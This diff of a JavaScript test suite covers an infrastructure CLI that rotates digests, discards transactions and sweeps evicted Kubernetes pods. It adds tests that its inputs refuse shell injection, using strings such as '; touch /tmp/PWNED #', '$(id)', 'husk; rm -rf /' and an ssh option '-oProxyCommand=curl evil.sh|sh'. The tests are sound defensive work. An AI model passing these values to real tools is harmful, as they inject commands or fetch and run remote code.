@@ -14,11 +14,22 @@
  *    binding, absent directory, and the probe/act re-assertion race (exit 9)
  *  - sweep-evicted-pods: owner with a Running replica selected, owner without
  *    one skipped, ownerless pods gated on age, Running/Pending/Succeeded never
- *    selected, namespace filtering
+ *    selected, namespace filtering, every-delete-failed
  *  - dry run is the default for all three: zero mutating adapter calls
+ *  - "untrusted input" (below): every operator flag and every host-read value
+ *    that reaches ssh's argv or the runner's shell, one test per way the cold
+ *    review of WM-1105 got a string through
  */
 import { test, expect, describe } from "bun:test";
-import { mkdtempSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
+import { spawnSync } from "node:child_process";
+import {
+  chmodSync,
+  mkdtempSync,
+  readFileSync,
+  readdirSync,
+  statSync,
+  writeFileSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import path from "node:path";
 import {
@@ -27,10 +38,14 @@ import {
   DRIVER_PATH,
   DRIVER_CONFIG,
   DEFAULT_NAMESPACES,
+  DRIVER_DIGEST_REPOS,
+  DISCARD_POINT_OF_NO_RETURN,
   ORPHAN_MIN_AGE_MS,
+  HOST_RE,
   evaluateDigestRotation,
   evaluateDiscard,
   patchResourceVersionPrecondition,
+  resolveDriverDigestRepo,
   selectEvictedPods,
   namespaceMatches,
   splitList,
@@ -38,6 +53,8 @@ import {
   parseDigestProbe,
   logStamp,
   makeLogger,
+  defaultSsh,
+  discardActScript,
   rotateDriverDigest,
   discardUnpreparedTransaction,
   sweepEvictedPods,
@@ -468,6 +485,49 @@ describe("discard-unprepared-transaction", () => {
     expect(scripts[1]).toContain("rm -rf");
   });
 
+  test("the act script re-reads the live resourceVersion under the re-taken lock, before the rm", () => {
+    const scripts = [];
+    const ssh = recorder((host, script) => {
+      scripts.push(script);
+      return scripts.length === 1
+        ? ok(probePayload())
+        : ok("== journal tail\n");
+    });
+    discardUnpreparedTransaction(
+      { role: "research-runner", yes: true },
+      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
+    );
+    const act = scripts[1];
+    // The probe's lock is released before this script runs, and a deployment
+    // can move without leaving a file behind, so the state-file re-assertions
+    // alone left a window the size of an ssh round-trip.
+    const check =
+      "kubectl -n 'legal-research-dev' get deployment 'legal-research-broker' -o jsonpath='{.metadata.resourceVersion}'";
+    expect(act).toContain(check);
+    expect(act).toContain(`[ "$LIVE" = '4547129' ]`);
+    expect(act.indexOf("flock -w 30 -x 9")).toBeLessThan(act.indexOf(check));
+    expect(act.indexOf(check)).toBeLessThan(act.indexOf('rm -rf "$DIR"'));
+    // A moved deployment is exit 9 (REFUSED); a re-check that could not be
+    // made at all is exit 10, which the caller reads as CANNOT EVALUATE.
+    expect(act).toContain("exit 10");
+  });
+
+  test("a deployment that moved between probe and act reports REFUSED", () => {
+    let call = 0;
+    const ssh = recorder(() => {
+      call += 1;
+      return call === 1
+        ? ok(probePayload())
+        : fail("deployment legal-research-dev/legal-research-broker moved", 9);
+    });
+    const result = discardUnpreparedTransaction(
+      { role: "research-runner", yes: true },
+      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
+    );
+    expect(result.exitCode).toBe(EXIT.REFUSED);
+    expect(result.actions).toBe(0);
+  });
+
   test("the act script losing the race (exit 9) reports REFUSED, not success", () => {
     let call = 0;
     const ssh = recorder(() => {
@@ -685,8 +745,8 @@ describe("sweep-evicted-pods", () => {
     expect(result.actions).toBe(2);
     expect(ssh.calls).toHaveLength(2);
     const scripts = ssh.calls.map((c) => c[1]);
-    expect(scripts[0]).toBe("kubectl delete pod -n office-abc husk-a\n");
-    expect(scripts[1]).toBe("kubectl delete pod -n office-abc husk-b\n");
+    expect(scripts[0]).toBe("kubectl delete pod -n 'office-abc' 'husk-a'\n");
+    expect(scripts[1]).toBe("kubectl delete pod -n 'office-abc' 'husk-b'\n");
     expect(scripts.join("")).not.toContain("lonely");
     expect(scripts.join("")).not.toContain("live");
   });
@@ -872,5 +932,495 @@ describe("runCli", () => {
     );
     expect(code).toBe(EXIT.OK);
     expect(gh.calls.every((c) => c[0][1] === "get")).toBe(true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Untrusted input.
+//
+// Everything below is a value that ends up in ssh's argv or in a script that
+// runs as root on the runner. The cold review of WM-1105 got `; touch
+// /tmp/PWNED #` all the way onto that shell through `--candidate-role`, so each
+// of these asserts the same two things: the refusal is exit 3, and the string
+// never reached an adapter.
+// ---------------------------------------------------------------------------
+
+const INJECTION = "; touch /tmp/PWNED #";
+
+describe("--candidate-role never reaches the runner's shell", () => {
+  const cliDeps = (extra = {}) => ({
+    ...silent(),
+    logDir: mkdtempSync(path.join(tmpdir(), "infra-inj-")),
+    now: () => NOW,
+    ...extra,
+  });
+
+  test("an injected --candidate-role is exit 3 and never opens an ssh", () => {
+    const ssh = recorder(() => ok());
+    const code = runCli(
+      [
+        "discard-unprepared-transaction",
+        "--role",
+        "research-runner",
+        "--candidate-role",
+        INJECTION,
+        "--yes",
+      ],
+      cliDeps({ ssh, deploymentResourceVersion: () => "4547129" }),
+    );
+    expect(code).toBe(EXIT.CANNOT_EVALUATE);
+    expect(ssh.calls).toHaveLength(0);
+  });
+
+  test("the verb refuses the same value when called directly", () => {
+    const ssh = recorder(() => ok());
+    const cap = capture();
+    const result = discardUnpreparedTransaction(
+      { role: "research-runner", yes: true, candidateRole: INJECTION },
+      { ssh, ...cap },
+    );
+    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
+    expect(ssh.calls).toHaveLength(0);
+    expect(cap.text()).toContain("--candidate-role");
+  });
+
+  test("and the script builder itself refuses to interpolate it", () => {
+    const args = {
+      binding: `sha256:${"a".repeat(64)}`,
+      candidateRole: "research_runner",
+      target: {
+        namespace: "legal-research-dev",
+        name: "legal-research-broker",
+      },
+      resourceVersion: "4547129",
+    };
+    expect(() => discardActScript("research-runner", args)).not.toThrow();
+    expect(() =>
+      discardActScript("research-runner", {
+        ...args,
+        candidateRole: INJECTION,
+      }),
+    ).toThrow(/candidate role/);
+    // A legitimate value is single-quoted rather than bare, so the quoting and
+    // the shape check each stand on their own.
+    const script = discardActScript("research-runner", args);
+    expect(script).toContain(
+      "rm -f '/var/lib/legalease/dev-qualification/exchange/publisher-research_runner-candidate.json'",
+    );
+  });
+
+  test("a bare --candidate-role flag is not a role", () => {
+    const ssh = recorder(() => ok());
+    expect(
+      runCli(
+        [
+          "discard-unprepared-transaction",
+          "--role",
+          "research-runner",
+          "--candidate-role",
+          "--yes",
+        ],
+        cliDeps({ ssh }),
+      ),
+    ).toBe(EXIT.CANNOT_EVALUATE);
+    expect(ssh.calls).toHaveLength(0);
+  });
+});
+
+describe("--yes --dry-run is contradictory, not permissive", () => {
+  const injected = (verb) => {
+    const ssh = recorder(() => ok());
+    const gh = recorder(() => ok());
+    const kubectlPods = recorder(() => ok(JSON.stringify({ items: [] })));
+    const argv = {
+      "rotate-driver-digest": [
+        "rotate-driver-digest",
+        "--digest",
+        DIGEST,
+        "--repos",
+        "lawz",
+      ],
+      "discard-unprepared-transaction": [
+        "discard-unprepared-transaction",
+        "--role",
+        "research-runner",
+      ],
+      "sweep-evicted-pods": ["sweep-evicted-pods"],
+    }[verb];
+    const code = runCli([...argv, "--yes", "--dry-run"], {
+      ...silent(),
+      logDir: mkdtempSync(path.join(tmpdir(), "infra-both-")),
+      ssh,
+      gh,
+      kubectlPods,
+      deploymentResourceVersion: () => "4547129",
+      now: () => NOW,
+    });
+    return { code, ssh, gh, kubectlPods };
+  };
+
+  for (const verb of [
+    "rotate-driver-digest",
+    "discard-unprepared-transaction",
+    "sweep-evicted-pods",
+  ]) {
+    test(`${verb} --yes --dry-run refuses and calls nothing`, () => {
+      const { code, ssh, gh, kubectlPods } = injected(verb);
+      expect(code).toBe(EXIT.CANNOT_EVALUATE);
+      expect(ssh.calls).toHaveLength(0);
+      expect(gh.calls).toHaveLength(0);
+      expect(kubectlPods.calls).toHaveLength(0);
+    });
+  }
+
+  test("the refusal says which flags disagree", () => {
+    const cap = capture();
+    runCli(["sweep-evicted-pods", "--yes", "--dry-run"], {
+      ...cap,
+      logDir: mkdtempSync(path.join(tmpdir(), "infra-both-")),
+      ssh: recorder(() => ok()),
+      kubectlPods: recorder(() => ok(JSON.stringify({ items: [] }))),
+      now: () => NOW,
+    });
+    expect(cap.text()).toContain("contradictory flags");
+    expect(cap.text()).toContain("--yes");
+    expect(cap.text()).toContain("--dry-run");
+  });
+
+  test("neither flag alone is affected", () => {
+    const deps = () => ({
+      ...silent(),
+      logDir: mkdtempSync(path.join(tmpdir(), "infra-one-")),
+      ssh: recorder(() => ok()),
+      kubectlPods: recorder(() => ok(JSON.stringify({ items: [] }))),
+      now: () => NOW,
+    });
+    expect(runCli(["sweep-evicted-pods", "--yes"], deps())).toBe(EXIT.OK);
+    expect(runCli(["sweep-evicted-pods", "--dry-run"], deps())).toBe(EXIT.OK);
+  });
+});
+
+describe("host-read values are inputs too", () => {
+  const base = {
+    dirExists: true,
+    promotionState: false,
+    coordinatorPhase: false,
+    patch: [
+      { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
+    ],
+    target: "legal-research-dev/legal-research-broker",
+    liveResourceVersion: "4547129",
+    binding: `sha256:${"a".repeat(64)}`,
+  };
+
+  test("a binding with a shell metacharacter is CANNOT EVALUATE", () => {
+    for (const binding of [
+      `sha256:${"a".repeat(64)}; touch /tmp/PWNED`,
+      "$(id)",
+      "sha256:nothex",
+      `SHA256:${"A".repeat(64)}`,
+    ]) {
+      const v = evaluateDiscard({
+        role: "research-runner",
+        probe: { ...base, binding },
+      });
+      expect(v.ok).toBe(false);
+      expect(v.exitCode).toBe(EXIT.CANNOT_EVALUATE);
+    }
+  });
+
+  test("the verb stops at the probe when the binding is not a sha256", () => {
+    const ssh = recorder(() =>
+      ok(
+        JSON.stringify({
+          dirExists: true,
+          promotionState: false,
+          coordinatorPhase: false,
+          patch: [
+            { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
+          ],
+          target: {
+            namespace: "legal-research-dev",
+            name: "legal-research-broker",
+          },
+          binding: `sha256:${"a".repeat(64)}; touch /tmp/PWNED`,
+          entries: ["qualification-stage.binding"],
+          exchange: [],
+        }),
+      ),
+    );
+    const result = discardUnpreparedTransaction(
+      { role: "research-runner", yes: true },
+      { ssh, deploymentResourceVersion: () => "4547129", ...silent() },
+    );
+    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
+    // Only the probe. The act script — which would have put that string on a
+    // sudo command line — was never built.
+    expect(ssh.calls).toHaveLength(1);
+  });
+
+  test("a legitimate binding is single-quoted on the sudo line", () => {
+    const binding = `sha256:${"a".repeat(64)}`;
+    const script = discardActScript("research-runner", {
+      binding,
+      candidateRole: "research_runner",
+      target: {
+        namespace: "legal-research-dev",
+        name: "legal-research-broker",
+      },
+      resourceVersion: "4547129",
+    });
+    expect(script).toContain(`--recover '${binding}'`);
+  });
+
+  test("a live-deployment.json naming something unshaped never reaches kubectl", () => {
+    const rv = recorder(() => "4547129");
+    const ssh = recorder(() =>
+      ok(
+        JSON.stringify({
+          dirExists: true,
+          promotionState: false,
+          coordinatorPhase: false,
+          patch: [
+            { op: "test", path: "/metadata/resourceVersion", value: "4547129" },
+          ],
+          target: { namespace: "legal-research-dev", name: "broker; id" },
+          binding: `sha256:${"a".repeat(64)}`,
+          entries: [],
+          exchange: [],
+        }),
+      ),
+    );
+    const result = discardUnpreparedTransaction(
+      { role: "research-runner", yes: true },
+      { ssh, deploymentResourceVersion: rv, ...silent() },
+    );
+    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
+    expect(rv.calls).toHaveLength(0);
+  });
+
+  test("a pod the cluster could not have named is kept, not deleted", () => {
+    const { selected, skipped } = selectEvictedPods(
+      [pod({ name: "husk; rm -rf /", owners: rs("u") })],
+      { patterns: splitList(DEFAULT_NAMESPACES), nowMs: NOW },
+    );
+    expect(selected).toHaveLength(0);
+    expect(skipped[0].why).toContain("RFC 1123");
+  });
+});
+
+describe("--repos is an allow-list", () => {
+  const cliDeps = () => ({
+    ...silent(),
+    logDir: mkdtempSync(path.join(tmpdir(), "infra-repos-")),
+    now: () => NOW,
+  });
+
+  test("only legalease and lawz resolve", () => {
+    expect(resolveDriverDigestRepo("legalease")).toBe("watt-mind/legalease");
+    expect(resolveDriverDigestRepo("watt-mind/lawz")).toBe("watt-mind/lawz");
+    expect(resolveDriverDigestRepo("factory")).toBe(null);
+    expect(resolveDriverDigestRepo("someone-else/legalease")).toBe(null);
+    expect(resolveDriverDigestRepo("")).toBe(null);
+    expect(DRIVER_DIGEST_REPOS.map((r) => r.slug)).toEqual([
+      "watt-mind/legalease",
+      "watt-mind/lawz",
+    ]);
+  });
+
+  test("a repo off the list is exit 3 without touching the host or gh", () => {
+    const ssh = recorder(() => ok(digestProbeOut(DIGEST, DIGEST)));
+    const gh = recorder(() => ok());
+    const code = runCli(
+      [
+        "rotate-driver-digest",
+        "--digest",
+        DIGEST,
+        "--repos",
+        "legalease,watt-mind/infra-secrets",
+        "--yes",
+      ],
+      { ...cliDeps(), ssh, gh },
+    );
+    expect(code).toBe(EXIT.CANNOT_EVALUATE);
+    expect(ssh.calls).toHaveLength(0);
+    expect(gh.calls).toHaveLength(0);
+  });
+
+  test("a mid-loop gh failure names the repos already rotated", () => {
+    let writes = 0;
+    const gh = recorder((args) => {
+      if (args[1] === "get") return ok(OTHER);
+      writes += 1;
+      return writes === 1 ? ok() : fail("HTTP 403");
+    });
+    const cap = capture();
+    const result = rotateDriverDigest(
+      { digest: DIGEST, repos: ["legalease", "lawz"], yes: true },
+      { ssh: recorder(() => ok(digestProbeOut(DIGEST, DIGEST))), gh, ...cap },
+    );
+    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
+    expect(result.actions).toBe(1);
+    expect(cap.text()).toContain("already rotated");
+    expect(cap.text()).toContain("watt-mind/legalease");
+    expect(cap.text()).toContain("watt-mind/lawz");
+  });
+});
+
+describe("--host is an ssh destination, not an option", () => {
+  test("HOST_RE takes plain destinations and refuses ssh options", () => {
+    for (const good of [
+      "hdkiller@100.74.142.98",
+      "runner",
+      "runner.internal.example.com",
+      "user@fd00::1",
+      "10.0.0.1",
+    ]) {
+      expect(HOST_RE.test(good)).toBe(true);
+    }
+    for (const bad of [
+      "-oProxyCommand=curl evil.sh|sh",
+      "-lroot",
+      "--",
+      "host; touch /tmp/PWNED",
+      "host $(id)",
+      "a b",
+      "",
+    ]) {
+      expect(HOST_RE.test(bad)).toBe(false);
+    }
+  });
+
+  test("an option-shaped --host is exit 3 before any adapter runs", () => {
+    const ssh = recorder(() => ok());
+    const kubectlPods = recorder(() => ok(JSON.stringify({ items: [] })));
+    const code = runCli(
+      [
+        "sweep-evicted-pods",
+        "--host",
+        "-oProxyCommand=curl evil.sh|sh",
+        "--yes",
+      ],
+      {
+        ...silent(),
+        logDir: mkdtempSync(path.join(tmpdir(), "infra-host-")),
+        ssh,
+        kubectlPods,
+        now: () => NOW,
+      },
+    );
+    expect(code).toBe(EXIT.CANNOT_EVALUATE);
+    expect(ssh.calls).toHaveLength(0);
+    expect(kubectlPods.calls).toHaveLength(0);
+  });
+
+  test("defaultSsh refuses a bad destination instead of spawning it", () => {
+    const run = defaultSsh("-oProxyCommand=id", "echo hi\n");
+    expect(run.status).not.toBe(0);
+    expect(run.stderr).toContain("refusing to ssh");
+  });
+});
+
+describe("the act script cannot lose a completed discard", () => {
+  const script = () =>
+    discardActScript("research-runner", {
+      binding: `sha256:${"a".repeat(64)}`,
+      candidateRole: "research_runner",
+      target: {
+        namespace: "legal-research-dev",
+        name: "legal-research-broker",
+      },
+      resourceVersion: "4547129",
+    });
+
+  test("errexit is never enabled, and the tail is best-effort", () => {
+    const s = script();
+    // The bug: `set -e` was restored before the removal, so a failing fsync or
+    // journal tail afterwards made the caller report "CANNOT EVALUATE —
+    // actions: 0" about a directory that was already gone.
+    expect(s).not.toContain("\nset -e\n");
+    expect(s).toContain(DISCARD_POINT_OF_NO_RETURN);
+    const [before, after] = s.split(DISCARD_POINT_OF_NO_RETURN);
+    expect(before).toContain('rm -rf "$DIR"');
+    expect(after.trimEnd().endsWith("exit 0")).toBe(true);
+    expect(after).toContain("WARNING");
+  });
+
+  test("the post-removal tail exits 0 even when every step fails", () => {
+    // Run the real epilogue under bash with `python3` and `sudo` replaced by
+    // failures. Under errexit — the pre-fix state of this script — the first
+    // failure would take the whole discard's exit status with it.
+    const shim = mkdtempSync(path.join(tmpdir(), "infra-shim-"));
+    for (const name of ["python3", "sudo"]) {
+      const file = path.join(shim, name);
+      writeFileSync(file, "#!/bin/sh\nexit 7\n");
+      chmodSync(file, 0o755);
+    }
+    const epilogue = script().split(DISCARD_POINT_OF_NO_RETURN)[1];
+    const run = spawnSync("bash", ["-c", `set -euo pipefail\n${epilogue}`], {
+      encoding: "utf8",
+      env: { ...process.env, PATH: `${shim}:${process.env.PATH}` },
+    });
+    expect(run.status).toBe(0);
+    expect(run.stdout).toContain("WARNING: fsync");
+    expect(run.stdout).toContain("WARNING: journal tail failed");
+    expect(run.stdout).toContain("exit 7");
+  });
+});
+
+describe("a sweep that deleted nothing is not a clean sweep", () => {
+  test("every delete failing is CANNOT EVALUATE, not OK", () => {
+    const ssh = recorder(() => fail("Unauthorized"));
+    const kubectlPods = recorder(() =>
+      ok(
+        JSON.stringify({
+          items: [
+            pod({ name: "husk-a", owners: rs("u") }),
+            pod({ name: "husk-b", owners: rs("u") }),
+            pod({
+              name: "live",
+              phase: "Running",
+              reason: null,
+              owners: rs("u"),
+            }),
+          ],
+        }),
+      ),
+    );
+    const cap = capture();
+    const result = sweepEvictedPods(
+      { yes: true },
+      { ssh, kubectlPods, now: () => NOW, ...cap },
+    );
+    expect(result.exitCode).toBe(EXIT.CANNOT_EVALUATE);
+    expect(result.actions).toBe(0);
+    expect(ssh.calls).toHaveLength(2);
+    expect(cap.text()).toContain("all 2 delete(s) failed");
+  });
+
+  test("selecting nothing at all is still a clean exit 0", () => {
+    const result = sweepEvictedPods(
+      { yes: true },
+      {
+        ssh: recorder(() => fail("Unauthorized")),
+        kubectlPods: recorder(() => ok(JSON.stringify({ items: [] }))),
+        now: () => NOW,
+        ...silent(),
+      },
+    );
+    expect(result.exitCode).toBe(EXIT.OK);
+    expect(result.actions).toBe(0);
+  });
+});
+
+describe("the log directory is not world-readable", () => {
+  test("makeLogger creates it 0700", () => {
+    const dir = path.join(
+      mkdtempSync(path.join(tmpdir(), "infra-mode-")),
+      "logs",
+    );
+    makeLogger("sweep-evicted-pods", { nowMs: NOW, logDir: dir });
+    // It records which host was touched and what was removed from it.
+    expect(statSync(dir).mode & 0o777).toBe(0o700);
   });
 });
